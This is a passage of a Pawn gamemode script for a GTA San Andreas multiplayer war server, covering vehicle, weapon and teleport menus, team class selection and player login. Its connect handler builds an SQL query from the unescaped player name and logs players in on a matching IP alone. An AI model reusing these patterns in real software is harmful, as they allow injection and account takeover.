 	fourdoor = CreateMenu("~b~4-door Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(fourdoor, 0, "Choose a car");
	AddMenuItem(fourdoor,0,"Perenniel");//404
	AddMenuItem(fourdoor,0,"Tahoma");//566
	AddMenuItem(fourdoor,0,"Voodoo");//412
	AddMenuItem(fourdoor,0,"Admiral");//445
	AddMenuItem(fourdoor,0,"Elegant");//507
	AddMenuItem(fourdoor,0,"Glendale");//466
	AddMenuItem(fourdoor,0,"Intruder");//546
	AddMenuItem(fourdoor,0,"Merit");//551
	AddMenuItem(fourdoor,0,"Oceanic");//467
	AddMenuItem(fourdoor,0,"Premier");//426
	AddMenuItem(fourdoor,0,"Sentinel");//405
	AddMenuItem(fourdoor,0,"Return");

 	fastcar = CreateMenu("~b~Fast Cars",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(fastcar, 0, "Choose a car");
	AddMenuItem(fastcar,0,"Comet");//480
	AddMenuItem(fastcar,0,"Buffalo");//402
	AddMenuItem(fastcar,0,"Cheetah");//415
	AddMenuItem(fastcar,0,"Euros");//587
	AddMenuItem(fastcar,0,"Hotring Racer");//494
	AddMenuItem(fastcar,0,"Infernus");//411
	AddMenuItem(fastcar,0,"Phoenix");//603
	AddMenuItem(fastcar,0,"Super GT");//506
	AddMenuItem(fastcar,0,"Turismo");//451
	AddMenuItem(fastcar,0,"ZR-350");//477
	AddMenuItem(fastcar,0,"Bullet");//541
	AddMenuItem(fastcar,0,"Return");

 	Othercars = CreateMenu("~b~Other Vehicles",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(Othercars, 0, "Choose a car?");
	AddMenuItem(Othercars,0,"Monster Truck");//556
	AddMenuItem(Othercars,0,"Trashmaster");//408
	AddMenuItem(Othercars,0,"Bus");//431
	AddMenuItem(Othercars,0,"Coach");//437
	AddMenuItem(Othercars,0,"Enforcer");//427
	AddMenuItem(Othercars,0,"Rhino (Tank)");//432
	AddMenuItem(Othercars,0,"S.W.A.T.Truck");//601
	AddMenuItem(Othercars,0,"Cement Truck");//524
	AddMenuItem(Othercars,0,"Flatbed");//455
	AddMenuItem(Othercars,0,"BF Injection");//424
	AddMenuItem(Othercars,0,"Dune");//573
	AddMenuItem(Othercars,0,"Return");

 	bikes = CreateMenu("~b~Bikes",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(bikes, 0, "Choose a bike");
	AddMenuItem(bikes,0,"BF-400");
	AddMenuItem(bikes,0,"BMX");
	AddMenuItem(bikes,0,"Faggio");
	AddMenuItem(bikes,0,"FCR-900");
	AddMenuItem(bikes,0,"Freeway");
	AddMenuItem(bikes,0,"NRG-500");
	AddMenuItem(bikes,0,"PCJ-600");
	AddMenuItem(bikes,0,"Pizzaboy");
	AddMenuItem(bikes,0,"Quad");
	AddMenuItem(bikes,0,"Sanchez");
	AddMenuItem(bikes,0,"Wayfarer");
	AddMenuItem(bikes,0,"Return");

 	boats = CreateMenu("~b~Boats",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(boats, 0, "Choose a boat");
	AddMenuItem(boats,0,"Coastguard");//472
	AddMenuItem(boats,0,"Dingy");//473
	AddMenuItem(boats,0,"Jetmax");//493
	AddMenuItem(boats,0,"Launch");//595
	AddMenuItem(boats,0,"Marquis");//484
	AddMenuItem(boats,0,"Predator");//430
	AddMenuItem(boats,0,"Reefer");//453
	AddMenuItem(boats,0,"Speeder");//452
	AddMenuItem(boats,0,"Squallo");//446
	AddMenuItem(boats,0,"Tropic");//454
	AddMenuItem(boats,0,"Return");

 	planes = CreateMenu("~b~Planes",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(planes, 0, "Choose a plane");
	AddMenuItem(planes,0,"Andromada");//592
	AddMenuItem(planes,0,"AT400");//577
	AddMenuItem(planes,0,"Beagle");//511
	AddMenuItem(planes,0,"Cropduster");//512
	AddMenuItem(planes,0,"Dodo");//593
	AddMenuItem(planes,0,"Hydra");//520
	AddMenuItem(planes,0,"Nevada");//553
	AddMenuItem(planes,0,"Rustler");//476
	AddMenuItem(planes,0,"Shamal");//519
	AddMenuItem(planes,0,"Skimmer");//460
	AddMenuItem(planes,0,"Stuntplane");//513
	AddMenuItem(planes,0,"Return");

	helicopters = CreateMenu("~b~Helicopters",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(helicopters, 0, "Choose a helicopter");
	AddMenuItem(helicopters,0,"Cargobob");//heli
	AddMenuItem(helicopters,0,"Hunter");//
	AddMenuItem(helicopters,0,"Leviathan");//
	AddMenuItem(helicopters,0,"Maverick");//
	AddMenuItem(helicopters,0,"News Chopper");//
	AddMenuItem(helicopters,0,"Police Maverick");//
	AddMenuItem(helicopters,0,"Raindance");//
	AddMenuItem(helicopters,0,"Seasparrow");//
	AddMenuItem(helicopters,0,"Sparrow");//
	AddMenuItem(helicopters,0,"Return");

 	XWeapons = CreateMenu("~b~Weapons ~g~Main Menu",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeapons, 0, "Choose a weapon");
	AddMenuItem(XWeapons,0,"Desert Eagle");//0
	AddMenuItem(XWeapons,0,"M4");
	AddMenuItem(XWeapons,0,"Sawnoff Shotgun");
	AddMenuItem(XWeapons,0,"Combat Shotgun");
	AddMenuItem(XWeapons,0,"UZI");
	AddMenuItem(XWeapons,0,"Rocket Launcher");
	AddMenuItem(XWeapons,0,"Minigun");//6
	AddMenuItem(XWeapons,0,"Sniper Rifle");
	AddMenuItem(XWeapons,0,"Big Weapons");
	AddMenuItem(XWeapons,0,"Small Weapons");//9
	AddMenuItem(XWeapons,0,"More");
	AddMenuItem(XWeapons,0,"Return");//11

 	XWeaponsBig = CreateMenu("~b~Weapons ~g~Big Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsBig,0,"Shotgun");
	AddMenuItem(XWeaponsBig,0,"AK-47");
	AddMenuItem(XWeaponsBig,0,"Country Rifle");
	AddMenuItem(XWeaponsBig,0,"HS Rocket Launcher");// youll get banned dont use
	AddMenuItem(XWeaponsBig,0,"Flamethrower");
	AddMenuItem(XWeaponsBig,0,"SMG");
	AddMenuItem(XWeaponsBig,0,"TEC9");
	AddMenuItem(XWeaponsBig,0,"Return");

 	XWeaponsSmall = CreateMenu("~b~Weapons ~g~Small Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsSmall,0,"9mm");
	AddMenuItem(XWeaponsSmall,0,"Silenced 9mm");
	AddMenuItem(XWeaponsSmall,0,"Molotov Cocktail");
	AddMenuItem(XWeaponsSmall,0,"Fire Extinguisher");
	AddMenuItem(XWeaponsSmall,0,"Spraycan");
	AddMenuItem(XWeaponsSmall,0,"Frag Grenades");
	AddMenuItem(XWeaponsSmall,0,"Samurai Sword");
	AddMenuItem(XWeaponsSmall,0,"Chainsaw");
	AddMenuItem(XWeaponsSmall,0,"Return");

 	XWeaponsMore = CreateMenu("~b~Weapons ~g~More Weapons",2, 55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(XWeaponsBig, 0, "Choose a weapon");
	AddMenuItem(XWeaponsMore,0,"Jetpack");
	AddMenuItem(XWeaponsMore,0,"Knife");
	AddMenuItem(XWeaponsMore,0,"Flowers");
	AddMenuItem(XWeaponsMore,0,"Camera");
	AddMenuItem(XWeaponsMore,0,"Pool Cue");
	AddMenuItem(XWeaponsMore,0,"Baseball Bat");
	AddMenuItem(XWeaponsMore,0,"Golf Club");
	AddMenuItem(XWeaponsMore,0,"MAX AMMO");
	AddMenuItem(XWeaponsMore,0,"Return");

	LTele = CreateMenu("Teleports", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LTele, 0, "Teleport to where?");
	AddMenuItem(LTele, 0, "Las Venturas");//0
	AddMenuItem(LTele, 0, "Los Santos");//1
	AddMenuItem(LTele, 0, "San Fierro");//2
	AddMenuItem(LTele, 0, "The Desert");//3
	AddMenuItem(LTele, 0, "Flint Country");//4
	AddMenuItem(LTele, 0, "Mount Chiliad");//5
	AddMenuItem(LTele, 0, "Interiors");//6
	AddMenuItem(LTele, 0, "Return");//8

	LasVenturasMenu = CreateMenu("Las Venturas", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LasVenturasMenu, 0, "Teleport to where?");
	AddMenuItem(LasVenturasMenu, 0, "The Strip");//0
	AddMenuItem(LasVenturasMenu, 0, "Come-A-Lot");//1
	AddMenuItem(LasVenturasMenu, 0, "LV Airport");//2
	AddMenuItem(LasVenturasMenu, 0, "KACC Military Fuels");//3
	AddMenuItem(LasVenturasMenu, 0, "Yellow Bell Golf Club");//4
	AddMenuItem(LasVenturasMenu, 0, "Baseball Pitch");//5
	AddMenuItem(LasVenturasMenu, 0, "Return");//6

	LosSantosMenu = CreateMenu("Los Santos", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(LosSantosMenu, 0, "Teleport to where?");
	AddMenuItem(LosSantosMenu, 0, "Ganton");//0
	AddMenuItem(LosSantosMenu, 0, "LS Airport");//1
	AddMenuItem(LosSantosMenu, 0, "Ocean Docks");//2
	AddMenuItem(LosSantosMenu, 0, "Pershing Square");//3
	AddMenuItem(LosSantosMenu, 0, "Verdant Bluffs");//4
	AddMenuItem(LosSantosMenu, 0, "Santa Maria Beach");//5
	AddMenuItem(LosSantosMenu, 0, "Mulholland");//6
	AddMenuItem(LosSantosMenu, 0, "Richman");//7
	AddMenuItem(LosSantosMenu, 0, "Return");//8

	SanFierroMenu = CreateMenu("San Fierro", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(SanFierroMenu, 0, "Teleport to where?");
	AddMenuItem(SanFierroMenu, 0, "SF Station");//0
	AddMenuItem(SanFierroMenu, 0, "SF Airport");//1
	AddMenuItem(SanFierroMenu, 0, "Ocean Flats");//2
	AddMenuItem(SanFierroMenu, 0, "Avispa Country Club");//3
	AddMenuItem(SanFierroMenu, 0, "Easter Basin (docks)");//4
	AddMenuItem(SanFierroMenu, 0, "Esplanade North");//5
	AddMenuItem(SanFierroMenu, 0, "Battery Point");//6
	AddMenuItem(SanFierroMenu, 0, "Return");//7

	DesertMenu = CreateMenu("The Desert", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(DesertMenu, 0, "Teleport to where?");
	AddMenuItem(DesertMenu, 0, "Aircraft Graveyard");//0
	AddMenuItem(DesertMenu, 0, "Area 51");//1
	AddMenuItem(DesertMenu, 0, "The Big Ear");//2
	AddMenuItem(DesertMenu, 0, "The Sherman Dam");//3
	AddMenuItem(DesertMenu, 0, "Las Barrancas");//4
	AddMenuItem(DesertMenu, 0, "El Quebrados");//5
	AddMenuItem(DesertMenu, 0, "Octane Springs");//6
	AddMenuItem(DesertMenu, 0, "Return");//7

	FlintMenu = CreateMenu("Flint Country", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(FlintMenu, 0, "Teleport to where?");
	AddMenuItem(FlintMenu, 0, "The Lake");//0
	AddMenuItem(FlintMenu, 0, "Leafy Hollow");//1
	AddMenuItem(FlintMenu, 0, "The Farm");//2
	AddMenuItem(FlintMenu, 0, "Shady Cabin");//3
	AddMenuItem(FlintMenu, 0, "Flint Range");//4
	AddMenuItem(FlintMenu, 0, "Becon Hill");//5
	AddMenuItem(FlintMenu, 0, "Fallen Tree");//6
	AddMenuItem(FlintMenu, 0, "Return");//7

	MountChiliadMenu = CreateMenu("Mount Chiliad", 2,  55.0, 200.0, 100.0, 80.0);
	SetMenuColumnHeader(MountChiliadMenu, 0, "Teleport to where?");
	AddMenuItem(MountChiliadMenu, 0, "Chiliad Jump");//0
	AddMenuItem(MountChiliadMenu, 0, "Bottom Of Chiliad");//1
	AddMenuItem(MountChiliadMenu, 0, "Highest Point");//2
	AddMenuItem(MountChiliadMenu, 0, "Chiliad Path");//3
	AddMenuItem(MountChiliadMenu, 0, "Return");//7

	InteriorsMenu = CreateMenu("Interiors", 2,  55.0, 200.0, 130.0, 80.0);
	SetMenuColumnHeader(InteriorsMenu, 0, "Teleport to where?");
	AddMenuItem(InteriorsMenu, 0, "Planning Department");//0
	AddMenuItem(InteriorsMenu, 0, "LV PD");//1
	AddMenuItem(InteriorsMenu, 0, "Pizza Stack");//2
	AddMenuItem(InteriorsMenu, 0, "RC Battlefield");//3
	AddMenuItem(InteriorsMenu, 0, "Caligula's Casino");//4
	AddMenuItem(InteriorsMenu, 0, "Big Smoke's Crack Palace");//5
	AddMenuItem(InteriorsMenu, 0, "Madd Dogg's Mansion");//6
	AddMenuItem(InteriorsMenu, 0, "Dirtbike Stadium");//7
	AddMenuItem(InteriorsMenu, 0, "Vice Stadium (duel)");//8
	AddMenuItem(InteriorsMenu, 0, "Ammu-nation");//9
	AddMenuItem(InteriorsMenu, 0, "Atrium");//7
	AddMenuItem(InteriorsMenu, 0, "Return");//8
	#endif

	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) OnPlayerConnect(i);
	for(new i = 1; i < MAX_CHAT_LINES; i++) Chat[i] = "<none>";
	for(new i = 1; i < MAX_REPORTS; i++) Reports[i] = "<none>";
	for(new i = 1; i < MAX_BANS; i++) Bans[i] = "<none>";

	return 1;
}

public OnPlayerCleoDetected( playerid, cleoid )
{
	return 1;
}
stock IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
    new Float:X, Float:Y, Float:Z;

    GetPlayerPos(playerid, X, Y, Z);
    if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY) {
        return 1;
    }
    return 0;
}

stock CheckHCPWSafety()
{
	for (new i = 0; i < sizeof(pws); i ++)
	{
	    if (strlen(pws[i]) < MIN_PW_LENGTH) return i;
	}
	return -1;
}

forward UpdateHCPWs();
public UpdateHCPWs()
{
	currenthcindex = random(sizeof(pws));

	new chpwd[16 + MAX_PW_LENGTH];
	format(chpwd, sizeof(chpwd), "rcon_password %s", pws[currenthcindex]);
	SendRconCommand(chpwd);
}
stock GetPlayerIDbyIP(const ip[])
{
	new pip[16];
	foreach(Player, i)
	{
	//	if(!IsPlayerConnected(i)) continue;
		GetPlayerIp(i, pip, 16);
	    if (!strcmp(ip, pip, true))
		{
			return i;
		}
	}
	return -1;
}

AntiDeAMX()
{
    new a[][] =
    {
            "Unarmed (Fist)",
            "Brass K"
    };
    #pragma unused a
}

/*stock SendBoxMessage(playerid, const text[])
{
    for(new line; line < 15; line++)
    {
        TextDrawShowForPlayer(playerid, Message[line]);
    }
    for(new line; line < 15; line++)
    {
        TextDrawHideForAll(Message[line]);
        if(line < 14)
        {
            MessageStr[line] = MessageStr[line+1];
            TextDrawSetString(Message[line], MessageStr[line]);
        }
    }
    format(MessageStr[8], 128, "%s",text);
    TextDrawSetString(Message[8], MessageStr[8]);
    for(new line; line < 15; line++)
    {
        TextDrawShowForAll(Message[line]);
    }
    return 1;
}
*/

public OnGameModeExit()
{
	//=======
	SaveStats();
	KillTimer(PingTimer);
//	Delete3DTextLabel(ProtLabel[A69Prot]);  //prototype
	#if defined USE_MENUS
	DestroyAllMenus();
	#endif
	for(new i=0; i<MAX_PLAYERS; i++)
	{
    	TextDrawHideForPlayer(i, Zones[i]);
	}
   	for(new i=0; i < MAX_PLAYERS+1; i++)
 	{
		if(grider[i][0])
		{
	    	DestroyObject(grider[i][0]);
	    	DestroyObject(grider[i][1]);
	    	DestroyObject(grider[i][2]);
	    	grider[i][0] = 0;
		}
	}
	MySQLCloseConnection();
	return 1;
}

stock SaveStats()
{
	foreach(Player, i)
	{
 		SendClientMessage(i, grey,"The server is restarting please wait 5-10 seconds...");
		SendClientMessage(i, COLOR_WHITE,".::Stats Saved::.");
		SavePlayer(i);
	}
	return 1;
}

forward RandomMessage();
public RandomMessage()
{
	SendClientMessageToAll(-1, RandomMessages[random(sizeof(RandomMessages))]);
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
 	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x,y,z);
	switch(classid)
	{
		case 0:
		{
			// EURASIA //
			SetPlayerFacingAngle(playerid, 341.0268);
			SetPlayerPos(playerid, 986.0437,2099.5232,23.9544);
			SetPlayerCameraPos(playerid, 987.9015, 2107.3215, 23.8944);
			SetPlayerCameraLookAt(playerid, 987.6723, 2106.3511, 23.8996, CAMERA_MOVE);
		 	SetPlayerSpecialAction(playerid, 68);
		    TextDrawShowForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			gTeam[playerid] = TEAM_EURASIA;
			SetPlayerTeam(playerid, 0);
			SetPlayerSkin(playerid, 73);
			SetPlayerColor(playerid, TEAM_EURASIA_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
		case 1:
		{
			// ARABIAN INVASION //
			SetPlayerFacingAngle(playerid, 90.0);
			SetPlayerPos(playerid, -794.9099,1610.2480,29.7032);
			SetPlayerCameraPos(playerid, -798.2032, 1611.5031, 30.2649);
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
  			SetPlayerCameraLookAt(playerid,-797.2197, 1611.3000, 30.1449,CAMERA_MOVE);
			TextDrawShowForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid, S);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			SetPlayerTeam(playerid, 1);
			SetPlayerSkin(playerid, 179);
			gTeam[playerid] = TEAM_ARAB;
			SetPlayerColor(playerid, TEAM_ARAB_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
		case 2:
		{
			// SOVIET UNION //
			SetPlayerFacingAngle(playerid, 181.3365);
			SetPlayerPos(playerid, -144.2001,1224.5303,26.2031);
			SetPlayerCameraPos(playerid, -144.0881, 1219.8387, 25.9057);
   			AnimLoopPlayer(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
			SetPlayerCameraLookAt(playerid, -144.1272, 1220.8354, 25.8959, CAMERA_MOVE);
			TextDrawShowForPlayer(playerid, S);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			SetPlayerSkin(playerid, 285);
			SetPlayerTeam(playerid, 2);
			gTeam[playerid] = TEAM_SOVIET;
			SetPlayerColor(playerid, TEAM_SOVIET_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
		case 3:
		{
			// USA //
			SetPlayerFacingAngle(playerid, 221.1536);
		   	SetPlayerPos(playerid, 223.5235,1925.1610,23.6406);
		   	SetPlayerCameraPos(playerid, 225.1002, 1919.4045, 23.5022);
   			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
			SetPlayerCameraLookAt(playerid, 224.6982, 1920.3141, 23.5323, CAMERA_MOVE);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			SetPlayerTeam(playerid, 3);
			SetPlayerSkin(playerid, 287);
			gTeam[playerid] = TEAM_USA;
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
		 case 4:
		 {
				// Aus //
			SetPlayerFacingAngle(playerid, 1.1915);
			SetPlayerPos(playerid, 404.6997,2476.0964,29.6423);
			SetPlayerCameraPos(playerid, 405.0119, 2480.5735, 29.7152);	SetPlayerFacingAngle(playerid, 1.1915);
            AnimLoopPlayer(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);
   			SetPlayerCameraLookAt(playerid, 405.0100, 2479.5798, 29.6652, CAMERA_MOVE);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, S);
			TextDrawShowForPlayer(playerid, A2);
			TextDrawHideForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			SetPlayerTeam(playerid, 4);
			SetPlayerSkin(playerid,206);
			gTeam[playerid] = TEAM_AUS;
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
		case 5:
		{
			// Vietnam //
			SetPlayerFacingAngle(playerid, 12.18);
			SetPlayerPos(playerid, -1514.32,2527.37,60.46);
			SetPlayerCameraPos(playerid, -1515.32,2529.47,62.46);
			SetPlayerFacingAngle(playerid,12.18);
            AnimLoopPlayer(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0);
   			SetPlayerCameraLookAt(playerid,-1514.72,2527.27,60.46 , CAMERA_MOVE);
			TextDrawShowForPlayer(playerid, I);
			TextDrawHideForPlayer(playerid, A);
			TextDrawHideForPlayer(playerid, S);
			TextDrawHideForPlayer(playerid, U);
			TextDrawHideForPlayer(playerid, EUR);
			TextDrawHideForPlayer(playerid,Load);
			TextDrawHideForPlayer(playerid,welcometo1);
			TextDrawHideForPlayer(playerid,welcometo2);
			TextDrawHideForPlayer(playerid, E);
			TextDrawHideForPlayer(playerid, A2);
			SetPlayerTeam(playerid,5 );
			SetPlayerSkin(playerid,122);
			gTeam[playerid] = TEAM_MARVEL;
			SetPlayerColor(playerid, TEAM_MARVEL_COLOR);
			Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
			FirstSpawn[playerid] = 1;
		}
	}
	return 1;
}

///Flood Control

public OnPlayerConnect(playerid)
{
//+++++++++++++++++++++++++++++++++SQL++++++++++++++++
    IsPlayerSpawned[playerid] = false;
    ResetEverything(playerid);
	MySQL_BanCheck(playerid);
    MySQL_BanCheck1(playerid); //for ip ban
    buggy[playerid] = 1;// set buggy login 0
    MoneyGiven[playerid] = -1; //Resets the variable that you will discover later in the tutorial.
    License[playerid] = 0;
    TempAdmin[playerid] = 0;
    MinigunDM[playerid] = 0;
    JetPack[playerid] = 1;
    ResetPlayerCash(playerid);
    new query[200], pname[24]; //Creates our variables.
    GetPlayerName(playerid, pname, 24); //Gets the players name
    format(query, sizeof(query), "SELECT IP FROM `Accounts` WHERE Name = '%s' LIMIT 1", pname); //Formats the query, view above the code for a explanation
    mysql_query(query); //This is our query function to query the string
    mysql_store_result(); //We store the result.
    new rows = mysql_num_rows(); //We get how many rows the query returned.
    if(!rows)
    {
        //If the rows are equal to 0. This means that the query did not find
        //anyone under the name we connected under in the database.
        //So here we send the player the register dialog.
        ShowPlayerDialog(playerid, 15000, DIALOG_STYLE_INPUT, "Register","Your user is {FF0000}not{FFFFFF} registered! Please {0000FF}register{FFFFFF} with a password below!","Register","Cancel"); //Shows our register dialog :).
    }
    if(rows == 1)
    {
        //If the rows are equal to 1, this means there is a player already registered
        //so we can initiate the login dialog to the player or check if the players
        //current IP is the same one as in the database.
        new IP[2][16]; //We create a variable with two IP strings, one for retrieving the mysql field and one for GetPlayerIP.
        mysql_fetch_field_row(IP[0],"IP");
        GetPlayerIp(playerid, IP[1], 16);
        if(strlen(IP[0]) != 0 && !strcmp(IP[0], IP[1], true)) //Checks that the MySQL IP has a value and that they are the same.
        {
            MySQL_Login(playerid);
            buggy[playerid] = 0;
        }
        else if(!strlen(IP[0]) || strcmp(IP[0], IP[1], true))
        {
            ShowPlayerDialog(playerid, 15500, DIALOG_STYLE_INPUT, "Login","Your user is {FF0000}registered{FFFFFF}! Please {0000FF}login{FFFFFF} with your password below!","Login","Cancel"); //Shows our login dialog :).
            IsRegistered[playerid] = 1; //Sets the registered variable to 1 (Shows that the player is registered).
            buggy[playerid] = 1;
        }
    }
    mysql_free_result();
    //You must always free the mysql result to avoid
    //there being massive memory usage.

//===============clansys================
    shotTime[playerid] = 0;
    shot[playerid] = 0;
//	StealingA69Prot[playerid] = 0;  //prototype

	new playername[128];

	new cfile[128];
	GetPlayerName(playerid, playername, sizeof(playername));
	format(cfile, sizeof(cfile), savefolderclan,playername);
	if(!dini_Exists(cfile)) {
	        dini_Create(cfile);
	        dini_IntSet(cfile, "gid", -1);
	        dini_IntSet(cfile, "ginvited", -1);
	       	dini_IntSet(cfile, "gattemptjoin", -1);
	       	dini_IntSet(cfile, "order", 0);

	       	group[playerid][gid] = (dini_Int(cfile, "gid"));
			group[playerid][invited] = (dini_Int(cfile, "ginvited"));
			group[playerid][attemptjoin] = (dini_Int(cfile, "gattemptjoin"));
			group[playerid][order] = (dini_Int(cfile, "order"));
			}
	else {
	       	group[playerid][gid] = (dini_Int(cfile, "gid"));
			group[playerid][invited] = (dini_Int(cfile, "ginvited"));
			group[playerid][attemptjoin] = (dini_Int(cfile, "gattemptjoin"));
			group[playerid][order] = (dini_Int(cfile, "order"));
			}

	//====================clan sys end================
	TextDrawShowForPlayer(playerid, Load);
	TextDrawShowForPlayer(playerid, welcometo1);
	TextDrawShowForPlayer(playerid, welcometo2);
	
//********************************************  DINI DUMP BY ABHAY   **************************************************
//	CheckBan(playerid);
//	CheckBanFromFile(playerid);
/*
	if (udb_Exists(PlayerName2(playerid)))
    {
	  if(PlayerInfo[playerid][LoggedIn] == 0)
	  {

	      ShowPlayerDialog(playerid, 125, DIALOG_STYLE_PASSWORD, ""cred"Account Login",""ccolor"This account is registered!"cgreen" Please login To continue","Login","Kick");
      }
    }
    if (!udb_Exists(PlayerName2(playerid)))
	{
      if(PlayerInfo[playerid][Registered] == 0)
	  {
	      new string[200];
		  format(string, sizeof(string),""cgreen"Welcome To Real World At War 2™ "cred"%s "ccolor"You are not Registered\n"corange"Please Enter a password to register an account", PlayerName2(playerid));
	      ShowPlayerDialog(playerid, 126, DIALOG_STYLE_PASSWORD, "Register",string,"Register","Kick");
      }
    }

    if(PlayerInfo[playerid][LoggedIn] == 1)
    {
        new pname[128];
	    new file[128];
	    GetPlayerName(playerid, pname, sizeof(pname));
        format(file, sizeof(file), savefolder,pname);
        if(!dini_Exists(file))
		{
	        dini_Create(file);
	        dini_IntSet(file, "Score", 0);
	        dini_IntSet(file, "Money", 0);
	        SetPlayerScore(playerid, dini_Int(file, "Score"));
	        SetPlayerMoney(playerid, dini_Int(file, "Money"));
        }

        else
		{
	        SetPlayerScore(playerid, dini_Int(file, "Score"));
	        SetPlayerMoney(playerid, dini_Int(file, "Money"));
	    }
	}
*/
//_____________________________________________________________________________________________________________________
	//-----
	IsPlayerUsingAnims[playerid] = 0;
	Synching[playerid] = false;
	IsPlayerAnimsPreloaded[playerid] = 0;
	for(new i; i<PING_MAX_EXCEEDS; i++) PlayerInfo[playerid][pPing][i] = 0;
	PlayerInfo[playerid][PingCount] = 0;
	PlayerInfo[playerid][PingTime] = 0;
	warnmsg[playerid] = 0;

    PlayersOnline++;
	new name[MAX_PLAYER_NAME], str[192];
	GetPlayerName(playerid, name, sizeof(name));
	format(str, sizeof(str), "~y~~h~[JOIN]~b~%s has ~g~~h~joined ~p~~h~the server!", name);
    SendBoxMessage(str);
    format(str,sizeof(str),"{009090}%s(%d) {FFFFFF}Has connected to the {009090} server[%d]", name,playerid,PlayersOnline );
	SendClientMessageToAll(C_GREY,str);
	#if defined IRCENABLED
    format(str, sizeof(str), "10[JOIN] %s[%d] has joined the server.4[%d]", name,playerid,PlayersOnline);
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif

//	 VBanCheck(playerid);

	SetPlayerWorldBounds(playerid, 9999.9, -9999.9, 9999.9, -9999.9 );
	//-----Music
	//-----
	 SendClientMessage(playerid,C_PINK,"Welcome To Real World At War 2™ Team Death Match!");
	 SendClientMessage(playerid,C_PINK,"Dont Forget To Read /rules Before Playing!");
	 SendClientMessage(playerid,C_PINK,"Roses Are Red Violets Are Blue, Bots Are Here, Watching You !");
	 SendClientMessage(playerid,C_PINK,"For Your Objectives Type /objectives And Dont Forget To Visit Us On xenon-extreme.com");
	 SendClientMessage(playerid,red,"Use /cmds To View Normal Player Commands");
     GetPlayerName(playerid, name, sizeof(name));
//     PlayAudioStreamForPlayer(playerid,"http://s320.ve.vc/data/320/32265/One_Bottle_Down_-_www.DjPunjab.Com.mp3");
